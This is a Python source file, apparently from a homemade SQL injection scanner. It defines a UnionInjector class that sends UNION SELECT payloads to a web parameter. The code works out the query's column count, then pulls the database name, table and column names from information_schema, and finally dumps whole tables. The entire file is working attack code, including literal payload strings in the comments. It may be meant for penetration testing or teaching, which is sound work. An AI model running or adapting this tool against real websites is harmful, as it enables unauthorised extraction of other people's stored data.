from core.requester import HttpResponse, Requester
from core.analyzer import Analyzer
from utils.constants import InjectionContext, differ_length_col_count, diff_marker
from utils.logger import Logger


class UnionInjector:
	"""
	`'`: closes the string
	Ex.: SELECT * FROM users WHERE id = '$id';
		=> SELECT * FROM users WHERE id = '' UNION SELECT...;

	UNION SELECT ... is appended to original query

	`--`: comments out the trailing `'` (the second one in `'$id'`)
	"""
 
	def __init__(self, requester: Requester, analyzer: Analyzer):
		self.requester = requester
		self.analyzer = analyzer

	def find_column_count(self, url: str, param: str, ctx: InjectionContext) -> int | None:
		"""Find the number of columns expected by the SQL query."""
  
		# Get a baseline to which we will compare the other response bodies
		baseline = self.requester.send(
			url,
			{param: ctx.prefix + ctx.suffix}
		)
		# Logger.debug(baseline.body)

		"""
		Try UNION SELECT statements with an increasing number of NULL values.

		As long as the number of selected columns does not match the original
		query, the database typically returns an SQL error.

		When a payload no longer triggers an SQL error and the response still
		looks like a valid application page, we have found the expected number
		of columns.
		"""
		for count in range(1, 20):
			
			# Create a NULL list matching the number of columns to test compatibility
			nulls = ",".join(["NULL"] * count)

			payload = f"{ctx.prefix}UNION SELECT {nulls}{ctx.suffix}"
			# Logger.debug(payload)

			response = self.requester.send(
				url,
				{param: payload}
			)
   
			if (
					not self.analyzer.has_sql_error(response)
					and not self.analyzer.responses_differ(
						baseline,
						response,
						differ_length_col_count,
				)
    		):
				# Logger.debug(response.body)
				return count

		return None

	def test_db_name(self, url: str, param: str) -> str:
		payload = "' UNION SELECT database() -- "

		response = self.requester.send(
			url,
			{param: payload}
		)

		return self._extract_text(response.body)


	def test_tables(self, url: str, param: str, ctx: InjectionContext, column_count) -> str | None:
		"""
		Test UNION injection to check if we can retrieve table names
  		"""

		"""
		First, check if the marker we inject in the SQL query is printed back
		in the response body. This would prove that the table names used in
  		the query are leaked in the HTML.
  		"""

		# Create a marker list matching the number of columns to make query compatible.
		nulls = ",".join([diff_marker] * (column_count))

		payload = (
			f"{ctx.prefix}UNION SELECT {nulls} FROM information_schema.tables{ctx.suffix}"
			#"1 UNION SELECT table_name,null FROM information_schema.tables"
			#"1' UNION SELECT table_name,null FROM information_schema.tables -- -"
		)
		# Logger.debug(payload)

		response = self.requester.send(
			url,
			{param: payload}
		)

		# Logger.debug(response.body)
		if diff_marker not in response.body:
			return None
  
		"""
		Now that we know the injection works we will get the real table names
  		"""
  
  		# Create a NULL list matching the number of columns to make query compatible.
		# We substract 1 from count because the main element is added afterwards 
		nulls = ",".join(["NULL"] * (column_count - 1))
	
		payload = (
			f"{ctx.prefix}UNION SELECT table_name,{nulls} FROM information_schema.tables{ctx.suffix}"

			# For testing manually:
			#"1 UNION SELECT table_name,null FROM information_schema.tables"
			#"1' UNION SELECT table_name,null FROM information_schema.tables -- -"
		)
		# Logger.debug(payload)

		response = self.requester.send(
			url,
			{param: payload}
		)

		# Logger.debug(response.body)
		return self._extract_text(response.body)


	def test_columns(self, url: str, param: str, table: str) -> str:
		payload = (
			f"' UNION SELECT column_name "
			f"FROM information_schema.columns "
			f"WHERE table_name='{table}' -- "
		)

		response = self.requester.send(
			url,
			{param: payload}
		)

		return self._extract_text(response.body)


	def dump_table(self, url: str, param: str, table: str, columns: str) -> str:
		payload = (
			f"' UNION SELECT {columns} "
			f"FROM {table} -- "
		)

		response = self.requester.send(
			url,
			{param: payload}
		)

		return self._extract_text(response.body)


	def _extract_text(self, body: str) -> str:
		"""
		Very simple extractor:
		keeps only useful lines.
		"""
		lines = body.split("\n")

		cleaned = [
			line.strip()
			for line in lines
			if line.strip()
		]

		return "\n".join(cleaned)
